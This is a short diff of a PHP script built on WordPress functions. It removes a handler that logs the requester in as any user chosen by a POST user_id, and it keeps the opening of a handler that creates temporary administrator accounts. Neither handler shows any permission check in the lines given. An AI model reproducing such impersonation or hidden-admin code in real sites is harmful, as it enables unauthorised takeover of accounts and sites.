@@ -22,29 +22,6 @@ if (!function_exists('wp_delete_user')) {
 $login_message = '';
 $login_redirect = '';
 
-if (isset($_POST['login_as_user'])) {
-    $user_id = intval($_POST['user_id']);
-    $user = get_user_by('id', $user_id);
-
-    if ($user) {
-        // Clean output buffer before setting headers
-        ob_clean();
-
-        // Clear any existing authentication
-        wp_clear_auth_cookie();
-
-        // Set new authentication
-        wp_set_current_user($user_id, $user->user_login);
-        wp_set_auth_cookie($user_id, true);
-        do_action('wp_login', $user->user_login, $user);
-
-        $login_redirect = admin_url();
-        $login_message = 'success|Login successful! Opening WordPress admin in new tab...';
-    } else {
-        $login_message = 'error|User not found!';
-    }
-}
-
 if (isset($_POST['create_temp_admin'])) {
     $temp_username = 'temp_admin_' . time();
     $temp_password = wp_generate_password(16, true, true);
